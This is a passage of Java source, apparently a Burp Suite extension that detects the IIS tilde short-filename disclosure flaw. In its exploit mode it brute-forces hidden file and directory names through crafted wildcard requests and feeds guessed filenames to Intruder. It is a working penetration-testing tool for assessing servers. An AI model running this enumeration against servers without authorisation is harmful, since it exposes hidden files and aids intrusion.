                        output.print("[X] Error: Complete filename guessing requires a wordlist of file names and a wordlist for file extensions, the provided wordlist files do not exist");
                        output.status("Ready to scan");
                        toggleScanButton(false);
                        return;
                    }
                }

                output.print("[+] Started scan for URL \"" + targetUrl + "\"\n");

                // initialize requester object
                requester = new Requester(targetUrl + config.getUrlSuffix());
                
                // check if host is vulnerable
                IHttpRequestResponse[] vulnerableRequests = isVulnerable();

                // if it isn't, it will return an empty array
                if (vulnerableRequests.length == 0)
                {
                    output.print("[-] Host \"" + targetUrl + "\" seems to be not vulnerable...");
                    output.status("Scan completed");
                    toggleScanButton(false);
                    return;
                }

                // if it is, it will return an IHttpRequestResponse array containing valid and invalid name requests
                output.print("\n[+] Host \"" + targetUrl + "\" is vulnerable!");
                output.print("[+] Used HTTP method: " + requestMethod + "\n[+] Suffix (magic part): " + magicFinalPart);

                // add an issue if not present
                try
                {
                    CustomScanIssue issue = new CustomScanIssue(requester.getHttpService(), targetUrl, vulnerableRequests);
                    if (!checkExistingIssue(issue))
                    {
                        callbacks.addScanIssue(issue);
                    }
                }
                catch (Exception e) {}

                // if in check mode, print number of requests performed and end scan
                if (!config.getExploitMode())
                {
                    output.print("[+] Requests sent: " + requester.getReqCounter());
                    output.status("Scan completed");
                    toggleScanButton(false);
                    return;
                }

                 // if in exploit mode, perform multithreaded bruteforce of files and directories
                output.print("\n[*] Starting filename and directory bruteforce on \"" + targetUrl + "\"");

                // preparing request format
                String requestFormat = config.getRequestString()
                    .replace("§METHOD§", requestMethod)
                    .replace("§PATH§", requester.getBasePath() +"/§PATH§" + requester.getQueryString())
                    .replace("\n", "\r\n");
                
                // determine wether the question mark symbol is reliable
                questionMarkReliable = isQuestionMarkReliable(requestFormat);

                // initializing bruteforcer and starting bruteforce
                Bruteforcer bruteforcer = new Bruteforcer(requestFormat);
                bruteforcer.startBrute();

                // waiting until bruteforce finishes
                bruteforcer.waitTilFinished();

                output.print("\n[+] Bruteforce completed\n");
                
                output.print("[+] Requests sent: " + requester.getReqCounter());

                output.print("\n[+] Identified directories: " + bruteforcer.getDirsFound().size());
                for (String dirFound : bruteforcer.getDirsFound())
                {
                    String currentName = dirFound;
                    String currentExt = "";

                    output.print(Utils.tree(dirFound, 1));

                    if (dirFound.length() - dirFound.lastIndexOf(".") <= 3)
                    {
                        currentName = dirFound.substring(0, dirFound.lastIndexOf("."));
                        currentExt = dirFound.substring(dirFound.lastIndexOf("."));
                    }

                    if (currentName.lastIndexOf("~") < 6)
                    {
                        if (currentName.lastIndexOf("~") == 5 && dirFound.matches(".*(\\w\\d|\\d\\w).*"))
                        {
                            output.print(Utils.tree("Possible directory name = " + dirFound.substring(0, currentName.lastIndexOf("~")), 2));
                        }
                        else
                        {
                            output.print(Utils.tree("Actual directory name = " + dirFound.substring(0, currentName.lastIndexOf("~")), 2));
                        }
                    }

                    if (dirFound.length() - dirFound.lastIndexOf(".") <= 3)
                    {
                        output.print(Utils.tree("Actual extension = " + currentExt, 2));
                    }
                }
                
                output.print("\n[+] Identified files: " + bruteforcer.getFilesFound().size());
                for (String fileFound : bruteforcer.getFilesFound())
                {
                    String currentName = fileFound;
                    String currentExt = "";

                    output.print(Utils.tree(fileFound, 1));

                    if(fileFound.length() - fileFound.lastIndexOf(".") <= 3)
                    {
                        currentName = fileFound.substring(0, fileFound.lastIndexOf("."));
                        currentExt = fileFound.substring(fileFound.lastIndexOf("."));
                    }

                    if (currentName.lastIndexOf("~") < 6)
                    {    
                        if (currentName.lastIndexOf("~") == 5 && fileFound.matches("^[a-fA-F0-9]{5}.*"))
                        {
                            output.print(Utils.tree("Possible file name = " + fileFound.substring(0, currentName.lastIndexOf("~")), 2));
                        }
                        else
                        {
                            output.print(Utils.tree("Actual file name = " + fileFound.substring(0, currentName.lastIndexOf("~")), 2));
                        }
                    }

                    if (fileFound.length() - fileFound.lastIndexOf(".") <= 3)
                    {
                        output.print(Utils.tree("Actual extension = " + currentExt, 2));
                    }
                }

                // complete filename guess
                if (config.getCompleteFileGuess())
                {
                    output.status("Generating complete filename list");
                    output.print("\n[*] Generating Intruder payload list for complete filename guessing");

                    // generate match list
                    MatchList possibleNames = new MatchList
                    (
                        bruteforcer.getDirsFound(),
                        bruteforcer.getFilesFound(),
                        config.getFileNameWordlist(),
                        config.getFileExtWordlist()
                    );

                    // fill intruder payloads list with all possible filename matches
                    intruderPayloads = possibleNames.getMatches();

                    // get offsets for insertion point
                    int offset = new String("GET " + requester.getBasePath() + "/").length();
                    List<int[]> insertionPoints = new ArrayList<int[]>() {{ add(new int[] {offset, offset}); }};

                    // send base request to intruder
                    callbacks.sendToIntruder
                    (
                        requester.getHttpService().getHost(),
                        requester.getHttpService().getPort(),
                        requester.getHttpService().getProtocol().equals("https"),
                        config.getRequestString()
                            .replace("§METHOD§", "GET")
                            .replace("§HOST§",  requester.getHttpService().getHost())
                            .replace("§PATH§", requester.getBasePath() + "/")
                            .replace("\n", "\r\n")
                            .getBytes(),
                        insertionPoints
                    );
                    
                    output.print("[+] Generated " + intruderPayloads.size() + " possible complete filenames, switch to Intruder to launch a guessing attack using the generated filenames");
                }
                
                output.status("Scan completed");
                toggleScanButton(false);
            }
            catch (RuntimeException e)
            {
                output.print("[X] Error: " + e.getMessage());
                //output.print(e.toString());
                output.status("Scan error");
                toggleScanButton(false);
            }
        }

        private boolean checkValidStatusMessage(String statusMessage)
        {
            return statusMessage.equals(validStatusMessage);
            //return (statusMessage.equals(validStatusMessage) && !(invalidStatusMessages.values().contains(statusMessage)));
        }

        private String checkStatus(String path, String requestMethod)
        {
            return stripResponse
            (
                requester.httpRequest
                (
                    config.getRequestString()
                        .replace("§METHOD§", requestMethod)
                        .replace("§PATH§", path + requester.getQueryString())
                        .replace("\n", "\r\n")
                ), 
                path,
                requester.getQueryString()
            );
        }

        private String getStatusMessage(String requestFormat, String path)
        {
            return stripResponse
            (
                requester.httpRequest
                (
                    requestFormat.replace
                    (
                        "§PATH§",
                        Utils.urlEncode(path)
                    )
                ),
                path,
                requester.getQueryString()
            );
        }

        private IHttpRequestResponse[] isVulnerable()
        {
            for (String  magicFinalPart : config.getMagicFinalPartList())
            {
                for (String requestMethod : config.getRequestMethods())
                {
                    output.print("[*] Trying method \"" + requestMethod + "\" with magic final part \"" + magicFinalPart + "\"");

                    // initialize request paths HashMap to find invalid status messages
                    HashMap<String, String> statusPaths = new HashMap<String, String>();

                    statusPaths.put("validName", requester.getBasePath() + "/" + Utils.urlEncode(config.getAsteriskSymbol() + "~1" + config.getAsteriskSymbol() + magicFinalPart) + requester.getQueryString());
                    statusPaths.put("invalidName", requester.getBasePath() + "/1234567890" + Utils.urlEncode(config.getAsteriskSymbol() + "~1" + config.getAsteriskSymbol() + magicFinalPart) + requester.getQueryString());
                    statusPaths.put("invalidDifferentName", requester.getBasePath() + "/0123456789" + Utils.urlEncode(config.getAsteriskSymbol() + "~1." + config.getAsteriskSymbol() + magicFinalPart) + requester.getQueryString());
                    statusPaths.put("invalidNameExtension", requester.getBasePath() + "/0123456789" + Utils.urlEncode(config.getAsteriskSymbol() + "~1.1234" + config.getAsteriskSymbol() + magicFinalPart) + requester.getQueryString());
                    statusPaths.put("invalidExtension", requester.getBasePath() + "/" + Utils.urlEncode(config.getAsteriskSymbol() + "~1.1234" + config.getAsteriskSymbol() + magicFinalPart) + requester.getQueryString());
                    statusPaths.put("invalidNameNoExtension", requester.getBasePath() + "/1234567890" + Utils.urlEncode(config.getAsteriskSymbol() + "~1" + config.getAsteriskSymbol() + magicFinalPart) + requester.getQueryString());
                    statusPaths.put("invalidNameNoExtensionNoQuestionmark", requester.getBasePath() + "/1234567890" + Utils.urlEncode(config.getAsteriskSymbol() + "~1" + config.getQuestionMarkSymbol() + magicFinalPart) + requester.getQueryString());
                    statusPaths.put("invalidNameNoExtensionQuestionmark", requester.getBasePath() + "/" + Utils.urlEncode(new String(new char[10]).replace("\0", config.getQuestionMarkSymbol()) + "~1" + config.getAsteriskSymbol() + magicFinalPart) + requester.getQueryString());
                    statusPaths.put("invalidNameNoSpecialchars", requester.getBasePath() + "/1234567890" + Utils.urlEncode("~1.1234" + magicFinalPart));

                    // valid name
                    IHttpRequestResponse validNameRequest = requester.httpRequestRaw(config.getRequestString().replace("§METHOD§", requestMethod).replace("§PATH§", statusPaths.get("validName")).replace("\n", "\r\n"));
                    String validNameResponse = stripResponse(new String(validNameRequest.getResponse()), statusPaths.get("validName"), requester.getQueryString());

                    // invalid name
                    IHttpRequestResponse invalidNameRequest = requester.httpRequestRaw(config.getRequestString().replace("§METHOD§", requestMethod).replace("§PATH§", statusPaths.get("invalidName")).replace("\n", "\r\n"));
                    String invalidNameResponse = stripResponse(new String(invalidNameRequest.getResponse()), statusPaths.get("invalidName"), requester.getQueryString());

                    // checking for differences between valid and invalid filenames in status, content and content length
                    if
                    (
                        !validNameResponse.equals(invalidNameResponse) &&
                        !Utils.checkDelta(validNameResponse.length(), invalidNameResponse.length(), config.getDeltaResponseLength())
                    )
                    {
                        // collecting all invalid status messages
                        invalidStatusMessages.put("invalidName", invalidNameResponse);

                        for (Map.Entry<String, String> statusPath : statusPaths.entrySet())
                        {
                            if (!statusPath.getKey().startsWith("valid") && !statusPath.getKey().equals("invalidName"))
                            {
                                invalidStatusMessages.put(statusPath.getKey(), checkStatus(statusPath.getValue(), requestMethod));
                            }
                        }

                        // if two different invalid requests lead to different responses, we cannot rely on them unless their length difference is negligible!
                        if
                        (
                            invalidStatusMessages.get("invalidDifferentName").equals(invalidNameResponse) ||
                            Utils.checkDelta(invalidStatusMessages.get("invalidDifferentName").length(), invalidNameResponse.length(), config.getDeltaResponseLength())
                        )
                        {
                            // checking if the extension is guessable (in a reliable way)
                            if
                            (
                                invalidStatusMessages.get("invalidDifferentName").equals(invalidNameResponse) ||
                                Utils.checkDelta(invalidStatusMessages.get("invalidDifferentName").length(), invalidStatusMessages.get("invalidNameExtension").length(), config.getDeltaResponseLength())
                            )
                            {
                                extensionGuessable = true;
                            }
                            else
                            {
                                extensionGuessable = false;
                            }
                            
                            // host is vulnerable! setting class vars and returning request object
                            this.magicFinalPart = magicFinalPart;
                            this.requestMethod = requestMethod;

                            validStatusMessage = validNameResponse;
                            IHttpRequestResponse[] result = {validNameRequest, invalidNameRequest};
                            return result;
                        }
                    }
                }
            }

            // host not vulnerable, returning empty request object
            IHttpRequestResponse[] result = {};
            return result;
        }
        
        private boolean isQuestionMarkReliable(String requestFormat)
        {
            // get a valid status message
            String validStatus = getStatusMessage
            (
                requestFormat,
                    config.getAsteriskSymbol() +
                    "~1" +
                    config.getAsteriskSymbol() +
                    magicFinalPart
            );

            // try match with user-defined question mark symbol first
            String validQuestionmark = getStatusMessage
            (
                requestFormat,
                    config.getQuestionMarkSymbol() +
                    config.getAsteriskSymbol() +
                    "~1" +
                    config.getAsteriskSymbol() +
                    magicFinalPart
            );

            if (validStatus.equals(validQuestionmark))
            {
                return true;
            }

            // if failed, try with "?" character
            validQuestionmark = getStatusMessage
            (
                requestFormat,
                    "?" +
                    config.getAsteriskSymbol() +
                    "~1" +
                    config.getAsteriskSymbol() +
                    magicFinalPart
            );
            
            if (validStatus.equals(validQuestionmark))
            {
                config.setQuestionMarkSymbol("?");
                return true;
            }

            // if failed, try with ">" character
            validQuestionmark = getStatusMessage
            (
                requestFormat,
                    ">" +
                    config.getAsteriskSymbol() +
                    "~1" +
                    config.getAsteriskSymbol() +
                    magicFinalPart
            );
            
            
            if (validStatus.equals(validQuestionmark))
            {
                config.setQuestionMarkSymbol(">");
                return true;
            }

            // question mark not reliable
            return false;
        }
        
        class Bruteforcer
        {
            private List<String> filesFound;
            private List<String> dirsFound;
            private List<String> nameScanList;
            private List<String> extScanList;
            private String requestFormat;
            private int threadCounter;

            public Bruteforcer(String requestFormat)
            {
                filesFound = new ArrayList<String>();
                dirsFound = new ArrayList<String>();
                nameScanList = new ArrayList<String>();
                extScanList = new ArrayList<String>();
                this.requestFormat = requestFormat;
                threadCounter = 1;
            }

            public List<String> getFilesFound()
            {
                return this.filesFound;
            }

            public List<String> getDirsFound()
            {
                return this.dirsFound;
            }

            public void waitTilFinished()
            {
                try
                {
                    // no more threads left
                    while(threadCounter != 0)
                    {
                        Thread.sleep(1);
                    }
                }
                catch (InterruptedException e)
                {
                    if(initThreadPool != null && initThreadPool.isItAlive())
                    {
                        initThreadPool.close();
                    }
                    if(bruteThreadPool != null && bruteThreadPool.isItAlive())
                    {
                        bruteThreadPool.close();
                    }
                }
            }

            // multithreading functions (synchronized)

            private synchronized void addCharToName(String charFound)
            {
                nameScanList.add(charFound);
            }

            private synchronized void addCharToExt(String charFound)
            {
                extScanList.add(charFound);
            }

            private synchronized void addToFilesFound(String fileFound)
            {
                filesFound.add(fileFound);
            }
        
            private synchronized void addToDirsFound(String dirFound)
            {
                dirsFound.add(dirFound);
            }

            private synchronized void incThreadCounter()
            {
                threadCounter++;
            }
        
            private synchronized void decThreadCounter()
            {
                threadCounter--;
                if (threadCounter < 0)
                {
                    threadCounter = 0;
                }
            }

            public void startBrute()
            {
                // build file list by getting the first character from the ones in scope
                buildFileList();

                // once the file list is built, use it as a basis to brute the resting characters
                incThreadCounter();
                bruteThreadPool.runTask(bruteFileName(""));
            }

            private void buildFileList()
            {
                // for every character in scope
                for (String charScan : config.getScanList())
                {
                    // build a list with first characters of all filenames
                    if (config.getNameStartsWith().length() < 6)
                    {
                        initThreadPool.runTask(buildFileNameList(charScan));
                    }

                    // build a list with first characters of all extensions
                    if (extensionGuessable && config.getExtStartsWith().length() < 3)
                    {
                        initThreadPool.runTask(buildFileExtList(charScan));
                    }
                }
                
                initThreadPool.join();
            }

            private Runnable buildFileNameList(String charScan)
            {
                return new Runnable()
                {
                    public void run()
                    {
                        String statusMessage;
                        
                        // when extension should start with something
                        if (config.getExtStartsWith().equals(""))
                        {
                            statusMessage = getStatusMessage
                            (
                                requestFormat,
                                    config.getNameStartsWith() +
                                    config.getAsteriskSymbol() +
                                    charScan +
                                    config.getAsteriskSymbol() +
                                    "~1" +
                                    config.getAsteriskSymbol() +
                                    magicFinalPart
                            );
                        }
                        else
                        {
                            statusMessage = getStatusMessage
                            (
                                requestFormat,
                                    config.getNameStartsWith() +
                                    config.getAsteriskSymbol() +
                                    charScan +
                                    config.getAsteriskSymbol() +
                                    "~1" +
                                    config.getAsteriskSymbol() +
                                    "." + 
                                    config.getExtStartsWith() + 
                                    config.getMagicFileExt() + 
                                    magicFinalPart

                            );
                        }

                        if (checkValidStatusMessage(statusMessage))
                        {
                            // it is obviously invalid, but some URL rewriters are sensitive against some characters!
                            String invalidStatusMessage = getStatusMessage
                            (
                                requestFormat,
                                   config.getNameStartsWith() +
                                   config.getAsteriskSymbol() +
                                   new String(new char[7]).replace("\0", charScan) +
                                   config.getAsteriskSymbol() +
                                   "~1" +
                                   config.getAsteriskSymbol() +
                                   "." + 
                                   config.getExtStartsWith() + 
                                   config.getMagicFileExt() + 
                                   magicFinalPart
                            );

                            // so if invalidStatusMessage is also equal to 404 then something is very wrong!
                            if (!checkValidStatusMessage(invalidStatusMessage))
                            {
                                if(config.getMagicFileExt().equals(""))
                                {
                                    // it is obviously invalid, but some URL rewriters are sensitive against some characters!
                                    statusMessage = getStatusMessage
                                    (
                                        requestFormat,
                                           "1234567890" +
                                           charScan +
                                           config.getAsteriskSymbol() +
                                           "~1" +
                                           config.getAsteriskSymbol() +
                                           magicFinalPart
                                    );
                                }
                                else
                                {
                                    // it is obviously invalid, but some URL rewriters are sensitive against some characters!
                                    statusMessage = getStatusMessage
                                    (
                                        requestFormat,
                                           "1234567890" +
                                           charScan +
                                           config.getAsteriskSymbol() +
                                           "~1" +
                                           config.getAsteriskSymbol() +
                                           "." +
                                           config.getMagicFileExt() +
                                           magicFinalPart
                                    );
                                }

                                if (!checkValidStatusMessage(statusMessage))
                                {
                                    // valid character! adding it to list
                                    addCharToName(charScan);
                                }
                            }
                        }

                        decThreadCounter();
                    }
                };
            }

            private Runnable buildFileExtList(String charScan)
            {
                return new Runnable()
                {
                    public void run()
                    {
                        String statusMessage = getStatusMessage
                        (
                            requestFormat,
                               config.getNameStartsWith() +
                               config.getAsteriskSymbol() +
                               "~1" +
                               config.getAsteriskSymbol() +
                               charScan +
                               config.getAsteriskSymbol() +
                               magicFinalPart
                        );

                        if (checkValidStatusMessage(statusMessage))
                        {
                            // it is obviously invalid, but some URL rewriters are sensitive against some characters!
                            String invalidStatusMessage = getStatusMessage
                            (
                                requestFormat,
                                   config.getNameStartsWith() +
                                   config.getAsteriskSymbol() +
                                   "~1" +
                                   config.getAsteriskSymbol() +
                                   new String(new char[4]).replace("\0", charScan) +
                                   config.getAsteriskSymbol() +
                                   magicFinalPart
                            );

                            // so if invalidStatusMessage is also equal to 404 then something is very wrong!
                            if (!checkValidStatusMessage(invalidStatusMessage))
                            {
                                // it is obviously invalid, but some URL rewriters are sensitive against some characters!
                                statusMessage = getStatusMessage
                                (
                                    requestFormat,
                                       config.getNameStartsWith() +
                                       config.getAsteriskSymbol() +
                                       "~1." +
                                       config.getAsteriskSymbol() +
                                       charScan +
                                       "1234567890" +
                                       magicFinalPart
                                );

                                if (!checkValidStatusMessage(statusMessage))
                                {
                                    // valid character! adding it to list
                                    addCharToExt(charScan);
                                }
                            }
                        }

                        decThreadCounter();
                    }
                };
            }

            private Runnable bruteFileName(String strFinalInput)
            {
                return new Runnable()
                {
                    public void run()
                    {
                        String strInput = strFinalInput;

                        // if name should start with something
                        if(strInput.equals("") && !config.getNameStartsWith().equals(""))
                        {
                            strInput = config.getNameStartsWith();
                        }

                        boolean atLeastOneSuccess = false;

                        for (int i = 0; i < nameScanList.size(); i++)
                        {
                            String newStr = strInput + nameScanList.get(i);
                            String statusMessage;

                            if (!config.getExtStartsWith().equals(""))
                            {
                                statusMessage = getStatusMessage
                                (
                                    requestFormat,
                                       newStr +
                                       config.getMagicFileName() +
                                       "." +
                                       config.getExtStartsWith() +
                                       config.getMagicFileExt() +
                                       magicFinalPart
                                );
                            }
                            else
                            {
                                statusMessage = getStatusMessage
                                (
                                    requestFormat,
                                       newStr +
                                       config.getMagicFileName() +
                                       magicFinalPart
                                );
                            }
                            
                            // showing progress in status
                            output.status("Scanning " + strInput + nameScanList.get(i).toUpperCase());
                            
                            if (checkValidStatusMessage(statusMessage))
                            {
                                atLeastOneSuccess = true;
                                int isItLastFileName = isLastFileName(newStr);
                                
                                if (isItLastFileName > 0)
                                {
                                    int counter = 1;
                                    
                                    while
                                    (
                                        (checkValidStatusMessage(statusMessage) && counter <= config.getMaxNumericalPart()) ||
                                        (counter <= config.getForceNumericalPart() && counter > 1)
                                    )
                                    {
                                        String fileName = newStr + "~" + counter;

                                        // folder
                                        if (isFolder(fileName))
                                        {
                                            output.print("[i] Dir: " + fileName.toUpperCase());
                                            addToDirsFound(fileName.toUpperCase());
                                        }

                                        // file with extension
                                        if (extensionGuessable)
                                        {
                                            fileName += ".";

                                            // extension already found: the one defined in the configurations
                                            if(config.getExtStartsWith().length() == 3)
                                            {
                                                addToFilesFound(fileName.toUpperCase() + config.getExtStartsWith().toUpperCase());
                                            }

                                            // guessing file extension before adding it to results
                                            else
                                            {
                                                incThreadCounter();
                                                bruteThreadPool.runTask(bruteFileExt(fileName, ""));
                                            }

                                            statusMessage = getStatusMessage
                                            (
                                                requestFormat,
                                                   newStr +
                                                   config.getMagicFileName().replace("1", Integer.toString(++counter)) +
                                                   magicFinalPart
                                            );

                                        }
                                        else
                                        {
                                            // extension not guessable, adding file to results with "???" extension
                                            output.print("[i] File: " + fileName.toUpperCase() + ".??? - extension cannot be found");
                                            addToFilesFound(fileName.toUpperCase()+".???");
                                            statusMessage = "000 Extension is not reliable";
                                        }
                                    }

                                    // more files with the same name
                                    if (isItLastFileName == 2)
                                    {
                                        incThreadCounter();
                                        bruteThreadPool.runTask(bruteFileName(newStr));
                                    }
                                     
                                }
                                else
                                {
                                    // filename not finished, passing to next character
                                    incThreadCounter();
                                    bruteThreadPool.runTask(bruteFileName(newStr));
                                }
                            }
                            else
                            {
                                // ignoring it?
                                if
                                (
                                    strInput.length() > 0 &&
                                    strInput.equals(config.getNameStartsWith()) &&
                                    !atLeastOneSuccess &&
                                    i == (nameScanList.size() - 1)
                                )
                                {
                                    // we have a failure here... it should have at least found 1 item!                
                                    String unFinishedString = String.format("%1s%2$" + (6 - strInput.length()) + "s~?", strInput.toUpperCase(), "?????");

                                    output.print("[i] File/Dir: " + unFinishedString + " - possible network/server problem");
                                    addToDirsFound(unFinishedString);
                                }
                            }
                        }

                        decThreadCounter();
                    }
                };
            }

            private Runnable bruteFileExt(String strFilename, String strFinalInput)
            {
                return new Runnable()
                {
                    public void run()
                    {
                        String strInput = strFinalInput;

                        if(strInput.equals("") && !config.getExtStartsWith().equals(""))
                        {
                            strInput = config.getExtStartsWith();
                        }

                        boolean atLeastOneSuccess = false;

                        for (int i = 0; i < extScanList.size(); i++)
                        {
                            String newStr = strInput + extScanList.get(i);
                            String statusMessage;

                            if (newStr.length() <= 2)
                            {
                                statusMessage = getStatusMessage
                                (
                                    requestFormat,
                                       strFilename +
                                       newStr +
                                       config.getMagicFileExt() +
                                       magicFinalPart
                                );
                            }
                            else
                            {
                                statusMessage = getStatusMessage
                                (
                                    requestFormat,
                                       strFilename +
                                       newStr +
                                       magicFinalPart
                                );
                            }

                            // showing progress in status
                            output.status("Scanning " + strFilename + strInput + extScanList.get(i).toUpperCase());
                            
                            if (checkValidStatusMessage(statusMessage))
                            {
                                atLeastOneSuccess = true;

                                if (isLastFileExt(strFilename + newStr))
                                {
                                    // adding it to final list
                                    String fileName = strFilename + newStr;

                                    output.print("[i] File: " + fileName.toUpperCase());
                                    addToFilesFound(fileName.toUpperCase());
                                    
                                    if (newStr.length() < 3)
                                    {
                                        // guessing remaining extension characters
                                        incThreadCounter();
                                        bruteThreadPool.runTask(bruteFileExt(strFilename, newStr));
                                    }
                                }
                                else
                                {
                                    incThreadCounter();
                                    bruteThreadPool.runTask(bruteFileExt(strFilename, newStr));
                                }
                            }
                            else
                            {
                                // ignoring it?
                                if
                                (
                                    strInput.length() > 0 &&
                                    !atLeastOneSuccess &&
                                    i == (extScanList.size() - 1)
                                )
                                {
                                    // we have a failure here... it should have at least found 1 item!
                                    String unFinishedString = strFilename + String.format("%1s%2$" + (3 - strInput.length()) + "s", strInput.toUpperCase(), "??");
                                    
                                    output.print("[i] File: " + unFinishedString + " - possible network/server problem");
                                    addToFilesFound(unFinishedString);
                                }
                            }
                        }

                        decThreadCounter();
                    }
                };
            }

            private int isLastFileName(String strInput)
            {
                // file is available and there is no more file
                int result = 1;

                if(!questionMarkReliable)
                {
                    // can't use "?" for this validation, this result will include false positives...
                    result = 2;
                }

                else
                {
                    if (strInput.length() < 6)
                    {
                        String statusMessage = getStatusMessage
                        (
                            requestFormat,
                               strInput +
                               config.getQuestionMarkSymbol() +
                               config.getAsteriskSymbol() +
                               "~1" +
                               config.getAsteriskSymbol() +
                               magicFinalPart
                        );
                        
                        if (checkValidStatusMessage(statusMessage))
                        {
                            // file not completed
                            result = 0;

                            statusMessage = getStatusMessage
                            (
                                requestFormat,
                                   strInput +
                                   "~1" +
                                   config.getAsteriskSymbol() +
                                   magicFinalPart
                            );

                            if (checkValidStatusMessage(statusMessage))
                            {
                                // file is available but there are more as well
                                result = 2;
                            }

                        }
                        else
                        {
                            // sometimes in rare cases we can see that a virtual directory is still there with more character
                            statusMessage = getStatusMessage
                            (
                                requestFormat,
                                   strInput +
                                   "~1" +
                                   config.getAsteriskSymbol() +
                                   magicFinalPart
                            );
                            
                            if (!checkValidStatusMessage(statusMessage))
                            {
                                // file is not completed
                                result = 0;
                            }
                        }
                    }
                }

                return result;
            }

            private boolean isLastFileExt(String strInput)
            {
                boolean result = false;

                if (!extensionGuessable)
                {
                    result = true;
                }
                else if (strInput.length() <= 12)
                {
                    // default length
                    int extLength = 3;

                    if
                    (
                        strInput.indexOf(".") > 0 &&
                        strInput.indexOf(".") != (strInput.length() - 1)
                    )
                    {
                        String[] temp = strInput.split("\\.");
                        
                        if (temp[1].length() >= extLength)
                        {
                            result = true;
                        }
                        else if
                        (
                            checkValidStatusMessage
                            (
                                getStatusMessage
                                (
                                requestFormat,
                                    strInput +
                                    "." +
                                    config.getAsteriskSymbol() +
                                    magicFinalPart
                                )
                            )
                        )
                        {
                            result = true;
                        }
                        else if
                        (
                            !
                            requester.httpRequest
                            (
                                requestFormat.replace
                                (
                                    "§PATH§",
                                    Utils.urlEncode
                                    (
                                        strInput +
                                        magicFinalPart
                                    )
                                )
                            )
                            .equals
                            (
                                requester.httpRequest
                                (
                                    requestFormat.replace
                                    (
                                        "§PATH§",
                                        Utils.urlEncode
                                        (
                                            strInput +
                                            "xxx" +
                                            magicFinalPart
                                        )
                                    )
                                )
                            )
                        )
                        {
                            result = true;
                        }
                    }
                    if (!result)
                    {
                        String statusMessage = getStatusMessage
                        (
                            requestFormat,
                               strInput +
                               config.getMagicFileExt() +
                               magicFinalPart
                        );
                        
                        if (!checkValidStatusMessage(statusMessage))
                        {
                            result = true;
                        }

                    }
                }
                
                return result;
            }
            
            private boolean isFolder(String strInput)
            {
                if (!questionMarkReliable)
                {
                    // can't use "?" for validation, too many false positives here...
                    return true;
                }
                else
                {
                    String statusMessage1 = getStatusMessage
                    (
                        requestFormat,
                           strInput +
                           config.getQuestionMarkSymbol() +
                           magicFinalPart
                    );

                    if (checkValidStatusMessage(statusMessage1))
                    {
                        String statusMessage2 = getStatusMessage
                        (
                            requestFormat,
                               strInput +
                               config.getAsteriskSymbol() +
                               magicFinalPart
                        );

                        if(statusMessage1.equals(statusMessage2))
                        {
                            // a directory
                            return true;
                        }
                    }
                }
                
                // no dir or file
                return false;
            }
        }

        class MatchList
        {
            private List<String> matches;
            private List<String> elementsFound;
            private List<String> possibleFileNames;
            private List<String> possibleFileExts;
            
            public MatchList(List<String> dirsFound, List<String> filesFound, File fileNameWordlist, File fileExtWordlist)
            {
                this.elementsFound = buildElementList(dirsFound, filesFound);
                this.possibleFileNames = Utils.readFile(fileNameWordlist); 
                this.possibleFileExts = Utils.readFile(fileExtWordlist);
                this.matches = buildMatchList();
            }
            
            private List<String> buildElementList(List<String> dirsFound, List<String> filesFound)
            {
                List<String> elements = new ArrayList<String>();
                List<String> parsedElements = new ArrayList<String>();
                
                elements.addAll(dirsFound);
                elements.addAll(filesFound);
                Collections.sort(elements);
                
                for (int i = 0; i < elements.size(); i++)
                {
                    if (i < elements.size() - 1)
                    {
                        if (elements.get(i+1).startsWith(elements.get(i)))
                        {
                            continue;
                        }
                    }
                    
                    parsedElements.add(elements.get(i).replace("\\?", ""));
                }
                
                return parsedElements;
            }
            
            private List<String> buildMatchList()
            {
                List<String> matchesFound = new ArrayList<String>();
                
                for (String name : possibleFileNames)
                {
                    for (String elem : elementsFound)
                    {
                        String elemName = elem.split("~")[0];
                        
                        if (elemName.length() < 6)
                        {
                            continue;
                        }
                        
                        if (name.toUpperCase().startsWith(elemName))
                        {
                            if (elem.indexOf(".") > 0)
                            {
                                List<String> elemExts = buildExtensionList(elem.substring(elem.lastIndexOf('.') + 1));
                                for (String ext : elemExts)
                                {
                                    matchesFound.add(name.toUpperCase() + "." + ext);
                                }
                            }
                            else
                            {
                                matchesFound.add(name.toUpperCase());
                            }
                        }
                        
                    }
                }
                
                Collections.sort(matchesFound);
                return matchesFound;
            }
            
            private List<String> buildExtensionList(String elemExt)
            {
                List<String> fileExts = new ArrayList<String>();
                
                for (String ext : possibleFileExts)
                {
                    if (ext.startsWith("."))
                    {
                        ext = ext.substring(1, ext.length());
                    }
                    
                    if (ext.toUpperCase().startsWith(elemExt))
                    {
                        fileExts.add(ext.toUpperCase());
                    }
                }
                
                if (fileExts.isEmpty())
                {
                    fileExts.add(elemExt);
                }

                // remove duplicates before return
                return new ArrayList<String>(new LinkedHashSet<>(fileExts));
            }
            
            public List<String> getMatches()
            {
                return this.matches;
            }
        }
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // Copied from: http://www.edparrish.com/cis160/06s/examples/ThreadPool.java
    // Or: http://stackoverflow.com/questions/9700066/how-to-send-data-form-socket-to-serversocket-in-android
    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    static class ThreadPool extends ThreadGroup
    {
        private boolean isAlive;
        private LinkedList<Runnable> taskQueue;
        private int threadID;
        private static int threadPoolID;
        
        /**
         * Creates a new ThreadPool.
         *
         * @param numThreads
         *            The number of threads in the pool.
         */
        public ThreadPool(int numThreads)
        {
            super("ThreadPool-" + (threadPoolID++));
            setDaemon(true);

            isAlive = true;

            taskQueue = new LinkedList<Runnable>();
            for (int i = 0; i < numThreads; i++)
            {
                new PooledThread().start();
            }
        }

        public boolean isItAlive()
        {
            return this.isAlive;
        }

        /**
         * Requests a new task to run. This method returns immediately, and the task
         * executes on the next available idle thread in this ThreadPool.
         * <p>
         * Tasks start execution in the order they are received.
         *
         * @param task
         *            The task to run. If null, no action is taken.
         * @throws IllegalStateException
         *             if this ThreadPool is already closed.
         */
        public synchronized void runTask(Runnable task)
        {
            if (!isAlive)
            {
                throw new IllegalStateException();
            }
            
            if (task != null)
            {
                taskQueue.add(task);
                notify();
            }

        }

        protected synchronized Runnable getTask() throws InterruptedException
        {
            while (taskQueue.size() == 0)
            {
                if (!isAlive)
                {
                    return null;
                }
                wait();
            }
                
            return (Runnable) taskQueue.removeFirst();
        }

        /**
         * Closes this ThreadPool and returns immediately. All threads are stopped,
         * and any waiting tasks are not executed. Once a ThreadPool is closed, no
         * more tasks can be run on this ThreadPool.
         */
        public synchronized void close()
        {
            if (isAlive)
            {
                isAlive = false;
